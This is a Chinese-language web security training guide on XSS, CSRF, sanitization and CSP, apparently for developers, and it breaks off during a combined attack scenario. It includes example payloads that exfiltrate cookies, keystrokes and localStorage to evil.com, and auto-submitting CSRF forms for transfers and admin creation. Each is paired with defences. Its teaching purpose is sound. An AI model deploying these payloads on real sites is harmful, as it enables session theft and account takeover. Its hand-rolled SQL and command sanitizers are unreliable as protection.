# Web 安全专项训练 — XSS / CSRF / Sanitization / CSP

> 2026-04-28 13:00 | 娄总 | 攻防演练 + 安全代码示例

---

## 目录

1. [XSS (跨站脚本攻击)](#1-xss)
2. [CSRF (跨站请求伪造)](#2-csrf)
3. [Sanitization (输入净化)](#3-sanitization)
4. [Content Security Policy (内容安全策略)](#4-csp)
5. [综合攻防演练](#5-攻防演练)
6. [安全代码 Checklist](#6-checklist)

---

## 1. XSS (跨站脚本攻击) <a id="1-xss"></a>

### 1.1 三种 XSS 类型

| 类型 | 触发点 | 存储位置 | 危害范围 |
|------|--------|---------|---------|
| **反射型** | URL 参数 → 页面输出 | 无 | 单次点击 |
| **存储型** | 用户输入 → 数据库 → 页面输出 | 数据库 | 所有访问者 |
| **DOM 型** | JS 直接操作 DOM (innerHTML) | 前端 | 当前页面 |

### 1.2 攻击示例

```html
<!-- ❌ 反射型 XSS: 攻击者构造恶意 URL -->
<!-- https://example.com/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script> -->

<!-- 后端直接拼接输出: -->
<div>搜索结果: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script></div>
```

```html
<!-- ❌ 存储型 XSS: 用户评论中注入脚本 -->
<!-- 攻击者提交: -->
{"comment": "<img src=x onerror='fetch(\"https://evil.com/steal?data=\"+document.cookie)'>"}

<!-- 其他用户浏览时自动执行 -->
<div class="comment">
  <img src=x onerror='fetch("https://evil.com/steal?data="+document.cookie)'>
</div>
```

```javascript
// ❌ DOM 型 XSS: 前端直接操作 DOM
const hash = window.location.hash; // #<script>alert(1)</script>
document.getElementById('content').innerHTML = hash.slice(1);

// ❌ DOM 型 XSS: 从 URL 读取参数直接插入
const params = new URLSearchParams(window.location.search);
const name = params.get('name');
document.body.innerHTML = `<h1>Welcome, ${name}!</h1>`;
```

### 1.3 防御方案

#### 方案 A: HTML 实体编码 (服务端)

```javascript
// ✅ 安全: HTML 实体编码
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
    '`': '&#96;',
  };
  return String(str).replace(/[&<>"'`\/]/g, (char) => map[char]);
}

// 使用示例
const userInput = '<script>alert(1)</script>';
// 输出: &lt;script&gt;alert(1)&lt;/script&gt;
// 浏览器渲染为纯文本，不执行
res.send(`<div>搜索结果: ${escapeHtml(userInput)}</div>`);
```

#### 方案 B: TextContent (前端)

```javascript
// ✅ 安全: 使用 textContent 而非 innerHTML
const userInput = '<script>alert(1)</script>';

// ❌ 危险
// document.getElementById('output').innerHTML = userInput;

// ✅ 安全
document.getElementById('output').textContent = userInput;
// 浏览器渲染为纯文本: <script>alert(1)</script>
```

#### 方案 C: 模板引擎自动转义

```javascript
// ✅ EJS 模板引擎: 使用 <%= %> 自动转义
// ❌ <%- %> 不转义，危险！

// 正确用法
// <%= user.name %>  →  自动转义为 HTML 实体
// <%- user.rawHtml %>  →  不转义 (仅在信任来源时使用)
```

```handlebars
{{!-- ✅ Handlebars: 默认转义 --}}
<h1>{{title}}</h1>        {{! 自动转义: &lt;script&gt; }}
<h1>{{{title}}}</h1>       {{! 不转义: 危险! }}
```

#### 方案 D: 前端框架内置防护

```javascript
// ✅ React: JSX 自动转义
function UserProfile({ name }) {
  // JSX 自动将 < > " ' 转义为实体
  return <div>Hello, {name}!</div>;
  // 即使 name = "<script>alert(1)</script>" 也不会执行
}

// ⚠️ React 唯一危险点: dangerouslySetInnerHTML
function RawHtml({ html }) {
  // 仅在绝对信任时使用!
  return <div dangerouslySetInnerHTML={{ __html: sanitize(html) }} />;
}

// ✅ Vue: 默认转义
// <template>
//   <div>{{ message }}</div>  {{! 自动转义 }}
//   <div v-html="rawHtml"></div>  {{! 不转义，需手动 sanitize }}
// </template>
```

#### 方案 E: 富文本 XSS 过滤

```javascript
// ✅ 使用 DOMPurify 清理富文本
// npm install dompurify jsdom

const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// 清理用户提交的富文本
const dirty = `
  <p>这是一段安全文本</p>
  <script>alert('xss')</script>
  <img src=x onerror="alert('xss')">
  <a href="javascript:alert('xss')">点击</a>
  <div style="background:url(javascript:alert('xss'))">
`;

const clean = DOMPurify.sanitize(dirty);
console.log(clean);
// 输出: <p>这是一段安全文本</p>
// <img src="x">  (onerror 被移除)
// <a>点击</a>  (javascript: href 被移除)
// <div>  (style 被移除)
```

```javascript
// ✅ 自定义白名单配置
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOWED_URI_REGEXP: /^(?!javascript:|data:|vbscript:)(?:https?:|mailto:|tel:)/i,
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
});
```

### 1.4 XSS 攻防演练

```javascript
// ===================== 攻防演练: XSS 攻击链 =====================

// --- 攻击场景 1: Cookie 窃取 ---
// 攻击者注入:
const attack1 = `<script>
  document.write('<img src="https://evil.com/steal?c=' + 
    document.cookie + '&u=' + encodeURIComponent(location.href) + '">');
</script>`;

// 防御: HttpOnly Cookie
// Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
// → JavaScript 无法通过 document.cookie 读取

// --- 攻击场景 2: Keylogger ---
const attack2 = `<script>
  document.onkeypress = function(e) {
    fetch('https://evil.com/log', {
      method: 'POST',
      body: JSON.stringify({ key: e.key, url: location.href })
    });
  };
</script>`;

// 防御: CSP (Content Security Policy)
// Content-Security-Policy: default-src 'self'; script-src 'self'

// --- 攻击场景 3: 页面劫持 ---
const attack3 = `<script>
  location.href = 'https://evil.com/phishing?redirect=' + 
    encodeURIComponent(location.href);
</script>`;

// 防御: X-Frame-Options + CSP frame-ancestors
// X-Frame-Options: DENY
// Content-Security-Policy: frame-ancestors 'none'

// --- 攻击场景 4: DOM Based XSS ---
// URL: https://example.com/page#<img src=x onerror=alert(1)>
const attack4 = window.location.hash;
// ❌ 危险
// document.getElementById('content').innerHTML = attack4;
// ✅ 防御
// document.getElementById('content').textContent = attack4;

// --- 攻击场景 5: SVG XSS ---
const attack5 = `<svg onload="alert(1)">
  <script>alert(2)</script>
  <image href="javascript:alert(3)">
</svg>`;

// 防御: 禁止 SVG 中的 script / 使用 DOMPurify
const clean5 = DOMPurify.sanitize(attack5, {
  ALLOWED_TAGS: ['svg', 'path', 'circle'],
  FORBID_TAGS: ['script'],
});

// --- 攻击场景 6: 属性注入 ---
const attack6 = '"><script>alert(1)</script><input value="';
// ❌ 危险模板:
// <input value="${attack6}">
// 输出: <input value=""><script>alert(1)</script><input value="">
// ✅ 防御: 属性值也要转义
// <input value="${escapeHtml(attack6)}">
```

---

## 2. CSRF (跨站请求伪造) <a id="2-csrf"></a>

### 2.1 攻击原理

```
用户登录了 Bank.com (Cookie 有效)
  ↓
用户访问 Evil.com
  ↓
Evil.com 页面包含:
  <form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
  </form>
  <script>document.forms[0].submit();</script>
  ↓
浏览器自动携带 Bank.com 的 Cookie 发送请求
  ↓
Bank.com 验证 Cookie 通过 → 转账成功!
```

### 2.2 攻击示例

```html
<!-- ❌ CSRF 攻击页面 (evil.com) -->
<!-- 方式 1: 自动提交的隐藏表单 -->
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/transfer" method="POST" style="display:none">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="99999">
  </form>
</body>

<!-- 方式 2: 图片标签 GET 请求 -->
<!-- https://bank.com/transfer?to=attacker&amount=10000 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">

<!-- 方式 3: Fetch 请求 -->
<script>
  fetch('https://bank.com/transfer', {
    method: 'POST',
    credentials: 'include', // 自动携带 Cookie
    body: 'to=attacker&amount=99999',
  });
</script>
```

### 2.3 防御方案

#### 方案 A: CSRF Token (推荐)

```javascript
// ===================== 服务端: 生成和验证 CSRF Token =====================

const crypto = require('crypto');
const session = require('express-session');

// Token 存储 (生产环境用 Redis)
const tokenStore = new Map();

// 生成 CSRF Token
function generateCSRFToken(req) {
  const token = crypto.randomBytes(32).toString('hex');
  // 绑定到 Session
  tokenStore.set(token, {
    sessionId: req.sessionID,
    expires: Date.now() + 3600000, // 1 小时过期
  });
  return token;
}

// 验证 CSRF Token
function verifyCSRFToken(req, res, next) {
  const token =
    req.body._csrf ||
    req.query._csrf ||
    req.headers['x-csrf-token'];

  if (!token) {
    return res.status(403).json({ error: 'CSRF token missing' });
  }

  const stored = tokenStore.get(token);
  if (!stored || stored.sessionId !== req.sessionID || Date.now() > stored.expires) {
    return res.status(403).json({ error: 'CSRF token invalid' });
  }

  // 一次性 Token: 验证后删除
  tokenStore.delete(token);
  next();
}

// Express 中间件
const app = express();

// 在表单页面注入 Token
app.get('/transfer', (req, res) => {
  const csrfToken = generateCSRFToken(req);
  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="_csrf" value="${csrfToken}">
      <input name="to" placeholder="收款账户">
      <input name="amount" placeholder="金额">
      <button type="submit">转账</button>
    </form>
  `);
});

// 提交时验证 Token
app.post('/transfer', verifyCSRFToken, (req, res) => {
  // 处理转账...
  res.json({ success: true });
});
```

```javascript
// ===================== 前端: 自动携带 CSRF Token =====================

// Fetch 封装
async function secureFetch(url, options = {}) {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;

  return fetch(url, {
    ...options,
    credentials: 'same-origin', // 仅同源携带 Cookie
    headers: {
      ...options.headers,
      'X-CSRF-Token': csrfToken || '',
      'Content-Type': 'application/json',
    },
  });
}

// Axios 拦截器
axios.interceptors.request.use((config) => {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
  if (csrfToken && config.method !== 'GET') {
    config.headers['X-CSRF-Token'] = csrfToken;
  }
  return config;
});
```

#### 方案 B: SameSite Cookie

```javascript
// ✅ 设置 SameSite 属性
// express-cookie-session 或 set-cookie

res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true, // 仅 HTTPS
  sameSite: 'strict', // 最严格: 跨站请求不发送 Cookie
  // sameSite: 'lax',  // 宽松: GET 跨站导航发送, POST 不发送
  // sameSite: 'none', // 不推荐: 跨站也发送 (需配合 Secure)
});

// Set-Cookie 响应头:
// Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

#### 方案 C: Referer / Origin 验证

```javascript
// ✅ 验证请求来源
function verifyOrigin(req, res, next) {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = ['https://myapp.com', 'https://www.myapp.com'];

  if (!origin) {
    // 同源请求没有 origin 头，允许
    return next();
  }

  const originHost = new URL(origin).hostname;
  if (!allowedOrigins.includes(originHost)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }

  next();
}

app.post('/api/transfer', verifyOrigin, (req, res) => {
  // 处理转账
});
```

#### 方案 D: 自定义 Header (Double Submit Cookie)

```javascript
// ===================== Double Submit Cookie 模式 =====================

// 服务端设置 CSRF Cookie
app.get('/page', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  res.cookie('csrf_token', token, {
    httpOnly: false, // 前端需要读取
    secure: true,
    sameSite: 'lax',
  });
  res.send(`<script>
    // 前端读取 Cookie 中的 token
    const csrfToken = document.cookie
      .split('; ')
      .find(c => c.startsWith('csrf_token='))
      ?.split('=')[1];
    
    // 请求时同时发送 Cookie (自动) 和 Header (手动)
    fetch('/api/transfer', {
      method: 'POST',
      credentials: 'same-origin',
      headers: { 'X-CSRF-Token': csrfToken },
    });
  </script>`);
});

// 服务端验证: Cookie 中的 token === Header 中的 token
app.post('/api/transfer', (req, res) => {
  const cookieToken = req.cookies.csrf_token;
  const headerToken = req.headers['x-csrf-token'];

  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF verification failed' });
  }
  // 处理请求...
});
```

### 2.4 CSRF 攻防演练

```javascript
// ===================== 攻防演练: CSRF 攻击链 =====================

// --- 攻击场景 1: 转账 ---
// Evil.com 页面:
const csrfAttack1 = `
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="evil">
  <input name="amount" value="100000">
</form>
<script>document.getElementById('f').submit()</script>
`;
// 防御: CSRF Token + SameSite=Strict

// --- 攻击场景 2: 修改密码 ---
const csrfAttack2 = `
<form action="https://app.com/api/change-password" method="POST" id="f">
  <input name="newPassword" value="hacked123">
</form>
<script>document.getElementById('f').submit()</script>
`;
// 防御: 需要旧密码验证 + CSRF Token

// --- 攻击场景 3: 添加管理员 ---
const csrfAttack3 = `
<form action="https://admin.com/api/users" method="POST" id="f">
  <input name="role" value="admin">
  <input name="username" value="evil_admin">
</form>
<script>document.getElementById('f').submit()</script>
`;
// 防御: 敏感操作二次确认 + CSRF Token

// --- 攻击场景 4: JSON CSRF (Content-Type: application/json) ---
// 现代浏览器中，跨站 fetch 无法设置 Content-Type 为 application/json
// 因为需要 CORS 预检 (OPTIONS)，而同源策略阻止了
// → JSON API 天然防御 CSRF
// ⚠️ 但如果服务端接受 application/x-www-form-urlencoded 作为备选，则仍有风险

// 防御: 服务端强制要求 Content-Type: application/json
app.use(express.json({ type: 'application/json' }));
// 拒绝非 JSON 的 POST 请求

// --- 攻击场景 5: 子域名 CSRF ---
// app.com 和 api.app.com 共享 Cookie
// 攻击者在 api.app.com 注入恶意代码 → 可访问 app.com 的 Cookie
// 防御: 子域名隔离 + 独立 CSRF Token 机制

// --- 攻击场景 6: 登录 CSRF (Session Fixation) ---
// 攻击者预先创建 Session，诱导用户使用该 Session 登录
// 防御: 登录后重新生成 Session ID
app.post('/login', (req, res) => {
  req.session.regenerate((err) => {
    if (err) return res.status(500).send('Session error');
    req.session.userId = user.id;
    res.json({ success: true });
  });
});
```

---

## 3. Sanitization (输入净化) <a id="3-sanitization"></a>

### 3.1 净化层级

```
用户输入
  ↓
[1] 验证 (Validation) — 检查格式、类型、范围
  ↓
[2] 净化 (Sanitization) — 移除/转义危险字符
  ↓
[3] 编码 (Encoding) — 按输出上下文编码
  ↓
安全输出
```

### 3.2 输入验证 (Validation)

```javascript
// ===================== 输入验证工具 =====================

// 方案 A: 手动验证函数
const validators = {
  // 邮箱验证
  isEmail(str) {
    return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(str);
  },

  // 用户名验证 (字母数字下划线, 3-20 字符)
  isUsername(str) {
    return /^[a-zA-Z0-9_]{3,20}$/.test(str);
  },

  // URL 验证 (禁止 javascript: / data: / vbscript:)
  isSafeUrl(str) {
    try {
      const url = new URL(str);
      return ['http:', 'https:', 'mailto:', 'tel:'].includes(url.protocol);
    } catch {
      return false;
    }
  },

  // 数字范围验证
  isInRange(num, min, max) {
    const n = Number(num);
    return !isNaN(n) && n >= min && n <= max;
  },

  // 长度验证
  isLength(str, min, max) {
    const len = String(str).length;
    return len >= min && len <= max;
  },
};

// 方案 B: Zod 类型验证 (推荐)
// npm install zod

const { z } = require('zod');

const UserSchema = z.object({
  username: z.string()
    .min(3, '用户名至少 3 个字符')
    .max(20, '用户名最多 20 个字符')
    .regex(/^[a-zA-Z0-9_]+$/, '只能包含字母、数字、下划线'),
  email: z.string()
    .email('邮箱格式不正确')
    .max(100),
  age: z.number()
    .int('年龄必须是整数')
    .min(0, '年龄不能为负数')
    .max(150, '年龄不合理'),
  website: z.string()
    .url('必须是有效的 URL')
    .refine((url) => {
      const parsed = new URL(url);
      return ['http:', 'https:'].includes(parsed.protocol);
    }, '只支持 http/https')
    .optional()
    .or(z.literal('')),
  bio: z.string()
    .max(500, '简介最多 500 个字符')
    .optional(),
});

// 使用
function createUser(req, res) {
  const result = UserSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({
      errors: result.error.errors.map((e) => ({
        field: e.path[0],
        message: e.message,
      })),
    });
  }
  // result.data 是类型安全的
  // 继续处理...
}
```

### 3.3 输入净化 (Sanitization)

```javascript
// ===================== 输入净化函数 =====================

// 方案 A: 手动净化
const sanitizers = {
  // 移除 HTML 标签
  stripHtml(str) {
    return String(str).replace(/<[^>]*>/g, '');
  },

  // 移除空白字符 (首尾)
  trim(str) {
    return String(str).trim();
  },

  // 移除所有空白
  removeWhitespace(str) {
    return String(str).replace(/\s+/g, '');
  },

  // 转义特殊字符
  escapeSpecial(str) {
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  },

  // 净化 URL (移除 javascript: / data: 等)
  sanitizeUrl(url) {
    try {
      const parsed = new URL(url);
      if (!['http:', 'https:', 'mailto:', 'tel:'].includes(parsed.protocol)) {
        return '#'; // 不安全，替换为 #
      }
      return url;
    } catch {
      return '#';
    }
  },

  // 防止 SQL 注入
  sanitizeSql(str) {
    return String(str)
      .replace(/'/g, "''") // 单引号转义
      .replace(/;/g, '') // 移除分号
      .replace(/--/g, '') // 移除注释
      .replace(/\/\*/g, '') // 移除块注释开始
      .replace(/\*\//g, ''); // 移除块注释结束
  },

  // 防止命令注入
  sanitizeCommand(str) {
    return String(str)
      .replace(/[;&|`$(){}[\]<>!\\'"\n\r]/g, '') // 移除 shell 元字符
      .replace(/\.\.\//g, '') // 防止路径遍历
      .replace(/^\//, ''); // 防止绝对路径
  },
};

// 方案 B: validator.js (npm install validator)
const validator = require('validator');

const sanitized = {
  email: validator.normalizeEmail(' User@Example.COM '),
  // → 'user@example.com'

  url: validator.isURL('https://example.com'),
  // → true

  alpha: validator.isAlpha('hello'),
  // → true

  alphanumeric: validator.isAlphanumeric('abc123'),
  // → true

  numeric: validator.isNumeric('12345'),
  // → true

  decimal: validator.isDecimal('123.45'),
  // → true

  // 白名单净化
  whitelist: validator.whitelist('hello<script>alert(1)</script>', 'abcdefghijklmnopqrstuvwxyz '),
  // → 'helloscriptalertscript'

  // 黑名单净化
  blacklist: validator.blacklist('hello<script>alert(1)</script>', '<>'),
  // → 'helloscriptalert(1)/script'

  // 转义 HTML
  escape: validator.escape('<script>alert(1)</script>'),
  // → '&lt;script&gt;alert(1)&lt;/script&gt;'
};
```

### 3.4 上下文感知的编码

```javascript
// ===================== 按输出上下文选择编码方式 =====================

const contextEncoders = {
  // HTML 正文
  html(str) {
    return String(str).replace(/[&<>"'`\/]/g, (c) => ({
      '&': '&amp;', '<': '&lt;', '>': '&gt;',
      '"': '&quot;', "'": '&#x27;', '`': '&#96;', '/': '&#x2F;',
    })[c]);
  },

  // HTML 属性值
  htmlAttribute(str) {
    // 属性值中的编码更严格
    return String(str).replace(/[&<>"'`\s\/=;]/g, (c) =>
      '&#x' + c.charCodeAt(0).toString(16).padStart(2, '0') + ';'
    );
  },

  // JavaScript 字符串
  jsString(str) {
    return String(str)
      .replace(/\\/g, '\\\\')
      .replace(/'/g, '\\\'')
      .replace(/"/g, '\\"')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/<\/script>/gi, '<\\/script>') // 防止闭合 script 标签
      .replace(/<!--/g, '\\u003C!--'); // 防止 HTML 注释闭合
  },

  // URL 参数
  urlParam(str) {
    return encodeURIComponent(String(str));
  },

  // CSS 值
  cssValue(str) {
    return String(str).replace(/[^a-zA-Z0-9\s\-_#.]/g, (c) =>
      '\\' + c.charCodeAt(0).toString(16)
    );
  },

  // JSON 值
  jsonValue(str) {
    return JSON.stringify(String(str));
  },
};

// 使用示例
const userInput = '<script>alert("XSS")</script>';

console.log(contextEncoders.html(userInput));
// → &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

console.log(contextEncoders.jsString(userInput));
// → \<script\>alert(\"XSS\")\<\/script\>

console.log(contextEncoders.urlParam(userInput));
// → %3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E
```

### 3.5 文件上传安全

```javascript
// ===================== 文件上传安全 =====================

const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

// 安全的文件存储配置
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    // 存储到独立目录，不在 public 目录下
    cb(null, path.join(__dirname, 'uploads/private'));
  },
  filename: (req, file, cb) => {
    // 使用随机文件名，避免路径遍历
    const ext = path.extname(file.originalname).toLowerCase();
    const randomName = crypto.randomBytes(16).toString('hex');
    cb(null, `${randomName}${ext}`);
  },
});

// 文件过滤
const fileFilter = (req, file, cb) => {
  // 白名单: 只允许图片
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
  const allowedExts = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];

  const ext = path.extname(file.originalname).toLowerCase();

  if (allowedTypes.includes(file.mimetype) && allowedExts.includes(ext)) {
    cb(null, true);
  } else {
    cb(new Error('只允许上传图片文件'), false);
  }
};

const upload = multer({
  storage,
  fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024, // 最大 5MB
    files: 3, // 最多 3 个文件
  },
});

// 使用
app.post('/upload', upload.array('photos', 3), (req, res) => {
  res.json({ success: true, files: req.files });
});

// 提供文件下载时设置安全 Header
app.get('/files/:filename', (req, res) => {
  res.set({
    'Content-Disposition': 'attachment', // 强制下载，不执行
    'X-Content-Type-Options': 'nosniff', // 禁止 MIME 嗅探
    'Content-Type': 'application/octet-stream', // 通用二进制类型
  });
  res.sendFile(path.join(__dirname, 'uploads/private', req.params.filename));
});
```

---

## 4. Content Security Policy (内容安全策略) <a id="4-csp"></a>

### 4.1 CSP 基础

```
CSP 是什么？
  → 浏览器安全策略，控制页面可以加载哪些资源

怎么配置？
  → HTTP 响应头: Content-Security-Policy
  → 或 <meta> 标签

作用？
  → 阻止 XSS: 禁止内联脚本、限制脚本来源
  → 阻止数据外泄: 限制 fetch/XMLHttpRequest 目标
  → 阻止点击劫持: 限制 iframe 嵌入
```

### 4.2 CSP 指令详解

```javascript
// ===================== CSP 策略配置 =====================

// 基础策略 (推荐起点)
const basePolicy = `
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self';
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  block-all-mixed-content;
`.replace(/\s+/g, ' ').trim();

// 响应头设置
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', basePolicy);
  next();
});

// ===== 各指令详解 =====

/*
default-src 'self'
  → 默认策略: 只允许同源资源
  → 未明确指定的资源类型都使用此策略

script-src 'self'
  → 脚本只允许同源
  → 阻止: 内联 <script>、eval()、远程脚本

script-src 'self' https://cdn.example.com
  → 允许同源 + 指定 CDN

script-src 'self' 'nonce-abc123'
  → 允许带特定 nonce 的内联脚本
  → <script nonce="abc123">...</script>

script-src 'self' 'strict-dynamic'
  → 信任的脚本可以动态加载其他脚本
  → 现代 CSP 推荐方式

style-src 'self' 'unsafe-inline'
  → 允许内联样式 (不推荐，但有时必需)
  → 更好的方式: 用 nonce 或 hash

img-src 'self' data: https:
  → 允许同源图片 + data URI + 所有 HTTPS 图片

connect-src 'self' https://api.example.com
  → 限制 fetch/XHR/WebSocket 的目标

frame-src 'none'
  → 禁止所有 iframe
  → frame-ancestors 'none' 防止被嵌入

object-src 'none'
  → 禁止 <object> <embed> <applet> (Flash 等)

base-uri 'self'
  → 限制 <base> 标签，防止 URL 基址篡改

form-action 'self'
  → 限制表单提交目标

upgrade-insecure-requests
  → 自动将 HTTP 请求升级为 HTTPS

block-all-mixed-content
  → 阻止混合内容 (HTTPS 页面加载 HTTP 资源)
*/
```

### 4.3 CSP 高级用法

```javascript
// ===================== CSP 高级配置 =====================

// 方案 A: Nonce 模式 (允许特定内联脚本)
const crypto = require('crypto');

app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;
  res.setHeader(
    'Content-Security-Policy',
    `default-src 'self'; script-src 'self' 'nonce-${nonce}'`
  );
  next();
});

// 模板中使用:
// <script nonce="<%= cspNonce %>">
//   // 这个内联脚本被允许执行
//   console.log('safe');
// </script>

// 方案 B: Hash 模式 (允许特定内容的内联脚本)
// 计算脚本内容的 SHA256 hash
const scriptContent = 'console.log("hello");';
const hash = crypto
  .createHash('sha256')
  .update(scriptContent)
  .digest('base64');

// CSP: script-src 'self' 'sha256-${hash}'
// <script>console.log("hello");</script>  → 允许

// 方案 C: strict-dynamic (现代推荐)
// CSP: script-src 'self' 'nonce-xxx' 'strict-dynamic'
// → 信任 nonce 脚本，该脚本动态加载的脚本也被信任
// → 不需要列出所有脚本来源

// 方案 D: Report-Only 模式 (测试 CSP)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy-Report-Only',
    `default-src 'self'; report-uri /csp-report`
  );
  next();
});

// 接收违规报告
app.post('/csp-report', express.json(), (req, res) => {
  console.log('CSP 违规:', JSON.stringify(req.body));
  res.status(204).send();
});
```

### 4.4 CSP 攻防演练

```javascript
// ===================== CSP 攻防演练 =====================

// --- 攻击场景 1: 内联脚本 XSS ---
// 攻击者注入:
const attack1 = '<script>alert(document.cookie)</script>';
// CSP 防御: script-src 'self' (无 'unsafe-inline')
// → 内联脚本被阻止 ✅

// --- 攻击场景 2: 事件处理器 XSS ---
const attack2 = '<img src=x onerror="alert(1)">';
// CSP 防御: script-src 'self' (事件处理器被视为内联脚本)
// → onerror 被阻止 ✅

// --- 攻击场景 3: eval() XSS ---
const attack3 = '<script>eval(userInput)</script>';
// CSP 防御: script-src 'self' (eval 被禁止)
// → eval 被阻止 ✅

// --- 攻击场景 4: 远程脚本加载 ---
const attack4 = '<script src="https://evil.com/steal.js"></script>';
// CSP 防御: script-src 'self' (无外部域名)
// → 远程脚本被阻止 ✅

// --- 攻击场景 5: 数据外泄 via fetch ---
// 攻击者注入:
const attack5 = `<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>`;
// CSP 防御: connect-src 'self'
// → 跨域 fetch 被阻止 ✅

// --- 攻击场景 6: iframe 嵌入钓鱼 ---
// 攻击者页面:
const attack6 = `<iframe src="https://bank.com/login"></iframe>`;
// CSP 防御: frame-ancestors 'none'
// → 页面无法被嵌入 iframe ✅

// --- 攻击场景 7: 表单劫持 ---
// 攻击者注入:
const attack7 = `<form action="https://evil.com/steal">
  <input name="password" type="password">
</form>`;
// CSP 防御: form-action 'self'
// → 表单只能提交到同源 ✅

// --- 绕过尝试 1: JSONP ---
// CSP 不能阻止 <script src="https://api.example.com/jsonp?callback=alert(1)">
// 因为 script-src 允许该域名
// 防御: 不使用 JSONP，改用 CORS + fetch

// --- 绕过尝试 2: Base 标签劫持 ---
// <base href="https://evil.com/"> 会使相对路径脚本从 evil.com 加载
// 防御: base-uri 'self' ✅

// --- 绕过尝试 3: 数据 URI ---
// <script src="data:text/javascript,alert(1)"></script>
// 防御: script-src 'self' (无 data:) ✅
```

### 4.5 完整 CSP 配置模板

```javascript
// ===================== 生产级 CSP 配置 =====================

const getCSPHeaders = (env) => {
  const isDev = env === 'development';

  // 开发环境更宽松
  const devExtras = isDev
    ? ' http://localhost:* ws://localhost:*'
    : '';

  return {
    // 主 CSP
    'Content-Security-Policy': [
      `default-src 'self'`,
      `script-src 'self' 'nonce-PLACEHOLDER' https://cdn.jsdelivr.net`,
      `style-src 'self' 'nonce-PLACEHOLDER' https://fonts.googleapis.com`,
      `img-src 'self' data: https:`,
      `font-src 'self' https://fonts.gstatic.com`,
      `connect-src 'self' https://api.example.com`,
      `frame-src 'none'`,
      `object-src 'none'`,
      `base-uri 'self'`,
      `form-action 'self'`,
      `upgrade-insecure-requests`,
      isDev ? '' : `block-all-mixed-content`,
    ].filter(Boolean).join('; '),

    // 旧版浏览器兼容
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '0', // CSP 已足够，关闭旧版 XSS filter
    'Referrer-Policy': 'strict-origin-when-cross-origin',

    // 权限策略
    'Permissions-Policy': [
      'camera=()',
      'microphone=()',
      'geolocation=()',
      'interest-cohort=()', // 关闭 FLoC
    ].join(', '),
  };
};

// Express 中间件
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  const headers = getCSPHeaders(process.env.NODE_ENV);
  Object.entries(headers).forEach(([key, value]) => {
    if (key === 'Content-Security-Policy') {
      res.setHeader(key, value.replace(/'nonce-PLACEHOLDER'/g, `'nonce-${nonce}'`));
    } else {
      res.setHeader(key, value);
    }
  });

  next();
});
```

---

## 5. 综合攻防演练 <a id="5-攻防演练"></a>

### 5.1 完整攻击场景模拟

```javascript
// ===================== 场景: 社交平台完整攻防 =====================

// --- 攻击者视角: 多步攻击链 ---

// Step 1: 存储型 XSS 注入
// 攻击者在评论区提交:
const maliciousComment = {
  postId: 123,
  content: `
    <img src=x onerror="
      // 窃取用户数据
      const data = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        page: location.href,
        userAgent: navigator.userAgent,
      };
      // 发送到攻击者服务器
      fetch('https://evil.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    ">
  `,
};

// Step 2: 利用窃取的数据进行 CSRF
// 攻击者用窃取的 Session Cookie 发送请求:
const csrfWithStolenCookie = {
  method: 'POST',
  url: 'https://social.com/api/change-email',
  headers: {
    Cookie: 'sessionId=stolen_session_id',
    'Content-Type': 'application/json',
  },
  body: { email: 'attacker@evil.com' },
};

// Step 3: 利用修改的邮箱重置密码
// 攻击者点击"忘记密码" → 重置链接发送到 attacker@evil.com

